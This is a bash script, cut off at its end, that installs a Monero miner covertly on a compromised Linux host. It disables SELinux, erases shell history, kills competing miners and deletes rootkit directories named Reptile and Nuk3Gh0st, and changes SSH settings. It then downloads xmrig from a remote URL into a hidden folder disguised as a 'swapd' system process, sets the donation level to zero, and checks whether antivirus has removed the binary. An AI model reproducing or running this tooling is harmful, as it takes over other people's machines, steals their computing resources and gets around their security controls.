#!/bin/bash

# Function to check if a directory exists before navigating to it
check_directory() {
    if [ -d "$1" ]; then
        cd "$1" || return 1
        return 0
    else
        echo "Directory $1 does not exist, skipping."
        return 1
    fi
}

# Function to detect package manager and run appropriate commands
detect_package_manager() {
    if command -v apt >/dev/null 2>&1; then
        echo "Detected apt package manager"
        PKG_MANAGER="apt"
    elif command -v yum >/dev/null 2>&1; then
        echo "Detected yum package manager"
        PKG_MANAGER="yum"
    elif command -v zypper >/dev/null 2>&1; then
        echo "Detected zypper package manager"
        PKG_MANAGER="zypper"
    else
        echo "No supported package manager found"
        PKG_MANAGER="none"
    fi
}

# Function to safely install packages
install_packages() {
    local packages="$1"
    
    case $PKG_MANAGER in
        apt)
            NEEDRESTART_MODE=a apt-get install -y $packages
            ;;
        yum)
            yum install -y $packages
            ;;
        zypper)
            zypper install -y $packages
            ;;
        *)
            echo "Cannot install packages: no supported package manager found"
            return 1
            ;;
    esac
}

# Initialize package manager detection
detect_package_manager

sudo setenforce 0  # Temporarily disable

# Fix repository issues based on detected package manager
if [ "$PKG_MANAGER" = "yum" ]; then
    echo "Checking and fixing YUM repositories if needed"
    # Only run if CentOS/RHEL repos exist and need fixing
    if [ -d "/etc/yum.repos.d" ] && [ -f "/etc/yum.repos.d/CentOS-Base.repo" ]; then
        echo "Fixing CentOS/RHEL repositories"
        sudo curl -o /etc/yum.repos.d/CentOS-Base.repo https://mirrors.aliyun.com/repo/Centos-7.repo
        sudo yum clean all && sudo yum makecache
    fi
    
    # Only fix MariaDB repo if it exists and needs fixing
    if [ -f "/etc/yum.repos.d/mariadb.repo" ]; then
        echo "Fixing MariaDB repository"
        sudo rm -f /etc/yum.repos.d/mariadb.repo
        sudo tee /etc/yum.repos.d/mariadb.repo <<'EOF'
[mariadb]
name = MariaDB
baseurl = https://mirror.mariadb.org/yum/10.11/rhel7-amd64
gpgkey=https://mirror.mariadb.org/yum/RPM-GPG-KEY-MariaDB
gpgcheck=1
EOF
    fi
fi

# ====== MODIFIED EMERGENCY HANDLING ======
# Create a safer emergency pipe mechanism
if [ -e /tmp/emergency_pipe ]; then
    rm -f /tmp/emergency_pipe
fi
mkfifo /tmp/emergency_pipe

# Replace the existing emergency pipe section with:
(
    sleep 30
    echo "[WARNING] Emergency timer triggered - continuing anyway" >&2
    # Instead of exiting, just kill potential problematic processes
    pkill -f "sleep \$timeout"  # Kill timeout killers
    rm -f /tmp/emergency_pipe
) &

# Set up safer trap handling
trap '
    echo "CLEANING UP..."; 
    kill %1 2>/dev/null;
    exec 1>&3 2>&4;
    exit 0  # Changed from exit 1 to prevent abrupt termination
' SIGTERM SIGINT SIGHUP

# ======== SSH PRESERVATION ========
echo "[*] Ensuring SSH access is preserved"
systemctl restart sshd
if [ -f "/etc/ssh/sshd_config" ]; then
    # Only add if not already present
    if ! grep -q "ClientAliveInterval" /etc/ssh/sshd_config; then
        echo "ClientAliveInterval 10" >> /etc/ssh/sshd_config
    fi
    if ! grep -q "ClientAliveCountMax" /etc/ssh/sshd_config; then
        echo "ClientAliveCountMax 3" >> /etc/ssh/sshd_config
    fi
    systemctl reload sshd
else
    echo "WARNING: sshd_config not found, cannot configure SSH keepalive"
fi

# Timeout and self-healing execution
timeout_run() {
    local timeout=5  # seconds
    local cmd="$@"
    
    # Run command in background
    $cmd &
    local pid=$!
    
    # Start timeout killer
    (sleep $timeout && kill -9 $pid 2>/dev/null) &
    local killer=$!
    
    # Wait for command completion
    wait $pid 2>/dev/null
    kill -9 $killer 2>/dev/null  # Cancel killer if command finished
}

# Command timeout with logging
safe_run() {
    local timeout=25
    echo "[SAFE_RUN] $@"
    timeout $timeout "$@"
    local status=$?
    if [ $status -eq 124 ]; then
        echo "[TIMEOUT] Command failed: $@"
        return 1
    fi
    return $status
}

# Add resilient command execution
run_resilient() {
    for i in {1..3}; do
        "$@" && return 0
        echo "[RETRY $i/3] Failed: $@"
        sleep $((RANDOM % 5 + 1))
    done
    echo "[WARNING] Ultimate failure: $@ - continuing anyway"
    return 0
}

# Secure history handling
unset HISTFILE
export HISTFILE=/dev/null

# Safely stop and disable services
systemctl stop gdm2 2>/dev/null || echo "gdm2 service not found"
systemctl disable gdm2 --now 2>/dev/null || echo "gdm2 service not found"
systemctl stop swapd 2>/dev/null || echo "swapd service not found"
systemctl disable swapd --now 2>/dev/null || echo "swapd service not found"

# Safely kill processes
safe_run pkill -f "swapd" || echo "No swapd processes found"
safe_run pkill -f "kswapd0" || echo "No kswapd0 processes found"

# Safely remove files with chattr protection
remove_protected_dir() {
    local dir="$1"
    if [ -d "$dir" ]; then
        safe_run chattr -i "$dir" 2>/dev/null
        safe_run chattr -i "$dir"/* 2>/dev/null
        safe_run chattr -i "$dir/.swapd" 2>/dev/null
        safe_run rm -rf "$dir"
    fi
}

# Clean up various directories
remove_protected_dir ".swapd"
remove_protected_dir ".gdm"
remove_protected_dir ".gdm2_manual"
remove_protected_dir ".gdm2_manual_*"
remove_protected_dir ".gdm2"

# Remove service files
if [ -f "/etc/systemd/system/swapd.service" ]; then
    safe_run chattr -i /etc/systemd/system/swapd.service
    safe_run rm -f /etc/systemd/system/swapd.service
fi

if [ -f "/etc/systemd/system/gdm2.service" ]; then
    safe_run chattr -i /etc/systemd/system/gdm2.service
    safe_run rm -f /etc/systemd/system/gdm2.service
fi

# Safely navigate to directories
if check_directory "/tmp"; then
    if check_directory ".ICE-unix" 2>/dev/null || check_directory ".X11-unix" 2>/dev/null; then
        # Clean up rootkit directories
        remove_protected_dir "Reptile"
        remove_protected_dir "Nuk3Gh0st"
    fi
fi

# Install curl if needed
if ! command -v curl >/dev/null 2>&1; then
    install_packages "curl"
fi

VERSION=2.11

# Printing greetings
echo "MoneroOcean mining setup script v$VERSION."
echo "(please report issues to support@moneroocean.stream email with full output of this script with extra \"-x\" \"bash\" option)"

if [ "$(id -u)" == "0" ]; then
  echo "WARNING: Generally it is not advised to run this script under root"
fi

# Command line arguments
WALLET=$1
EMAIL=$2 # this one is optional

echo "[*] Checking prerequisites..."

if [ -z $WALLET ]; then
  echo "Script usage:"
  echo "> setup_swapd_processhider.sh <wallet address> [<your email address>]"
  echo "ERROR: Please specify your wallet address"
  exit 1
fi

WALLET_BASE=$(echo $WALLET | cut -f1 -d".")
if [ ${#WALLET_BASE} != 106 -a ${#WALLET_BASE} != 95 ]; then
  echo "ERROR: Wrong wallet base address length (should be 106 or 95): ${#WALLET_BASE}"
  exit 1
fi

if [ -z $HOME ]; then
  echo "ERROR: Please define HOME environment variable to your home directory"
  exit 1
fi

if [ ! -d $HOME ]; then
  echo "ERROR: Please make sure HOME directory $HOME exists or set it yourself using this command:"
  echo '  export HOME=<dir>'
  exit 1
fi

# Check for required utilities
for cmd in curl lscpu; do
  if ! command -v $cmd >/dev/null 2>&1; then
    echo "WARNING: This script requires \"$cmd\" utility to work correctly"
    install_packages $cmd
  fi
done

echo "[*] Calculating port..."
CPU_THREADS=$(nproc)
EXP_MONERO_HASHRATE=$((CPU_THREADS * 700 / 1000))
if [ -z $EXP_MONERO_HASHRATE ]; then
  echo "ERROR: Can't compute projected Monero CN hashrate"
  exit 1
fi

power2() {
  if ! command -v bc >/dev/null 2>&1; then
    if [ "$1" -gt "8192" ]; then
      echo "8192"
    elif [ "$1" -gt "4096" ]; then
      echo "4096"
    elif [ "$1" -gt "2048" ]; then
      echo "2048"
    elif [ "$1" -gt "1024" ]; then
      echo "1024"
    elif [ "$1" -gt "512" ]; then
      echo "512"
    elif [ "$1" -gt "256" ]; then
      echo "256"
    elif [ "$1" -gt "128" ]; then
      echo "128"
    elif [ "$1" -gt "64" ]; then
      echo "64"
    elif [ "$1" -gt "32" ]; then
      echo "32"
    elif [ "$1" -gt "16" ]; then
      echo "16"
    elif [ "$1" -gt "8" ]; then
      echo "8"
    elif [ "$1" -gt "4" ]; then
      echo "4"
    elif [ "$1" -gt "2" ]; then
      echo "2"
    else
      echo "1"
    fi
  else
    echo "x=l($1)/l(2); scale=0; 2^((x+0.5)/1)" | bc -l
  fi
}

echo "[*] Printing intentions..."
echo "I will download, setup and run in background Monero CPU miner."
echo "If needed, miner in foreground can be started by $HOME/.swapd/swapd.sh script."
echo "Mining will happen to $WALLET wallet."
if [ ! -z $EMAIL ]; then
  echo "(and $EMAIL email as password to modify wallet options later at https://moneroocean.stream site)"
fi
echo

if ! sudo -n true 2>/dev/null; then
  echo "Since I can't do passwordless sudo, mining in background will started from your $HOME/.profile file first time you login this host after reboot."
else
  echo "Mining in background will be performed using moneroocean_miner systemd service."
fi
echo

echo "JFYI: This host has $CPU_THREADS CPU threads, so projected Monero hashrate is around $EXP_MONERO_HASHRATE KH/s."
echo
echo "Sleeping for 3 seconds before continuing (press Ctrl+C to cancel)"
sleep 3
echo
echo

echo "[*] Start doing stuff: preparing miner..."
echo "[*] Removing previous moneroocean miner (if any)"
if sudo -n true 2>/dev/null; then
  sudo systemctl stop moneroocean_miner.service 2>/dev/null || true
  sudo systemctl stop gdm2.service 2>/dev/null || true
fi

safe_run pkill -9 xmrig || true
safe_run pkill -9 kswapd0 || true

echo "[*] Removing previous directories..."
rm -rf $HOME/moneroocean 2>/dev/null || true
rm -rf $HOME/.moneroocean 2>/dev/null || true
rm -rf $HOME/.gdm2* 2>/dev/null || true

echo "[*] Downloading MoneroOcean advanced version of xmrig to /tmp/xmrig.tar.gz"
if ! curl -L --progress-bar "https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz" -o /tmp/xmrig.tar.gz; then
  echo "ERROR: Can't download xmrig.tar.gz, trying alternative method"
  if ! wget --no-check-certificate https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz -O /tmp/xmrig.tar.gz; then
    echo "ERROR: Both curl and wget failed to download xmrig.tar.gz"
  fi
fi

echo "[*] Unpacking xmrig.tar.gz to $HOME/.swapd/"
mkdir -p $HOME/.swapd/
if ! tar xzf /tmp/xmrig.tar.gz -C $HOME/.swapd/; then
  echo "ERROR: Can't unpack xmrig.tar.gz to $HOME/.swapd/ directory"
else
  rm /tmp/xmrig.tar.gz
fi

echo "[*] Checking if advanced version of $HOME/.swapd/xmrig works fine (and not removed by antivirus software)"
sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' $HOME/.swapd/config.json
$HOME/.swapd/xmrig --help >/dev/null
if (test $? -ne 0); then
  if [ -f $HOME/.swapd/xmrig ]; then
    echo "WARNING: Advanced version of $HOME/.swapd/xmrig is not functional"
  else
    echo "WARNING: Advanced version of $HOME/.swapd/xmrig was removed by antivirus (or some other problem)"
  fi
  
  echo "[*] Looking for the latest version of Monero miner"
  LATEST_XMRIG_RELEASE=$(curl -s https://github.com/xmrig/xmrig/releases/latest | grep -o '".*"' | sed 's/"
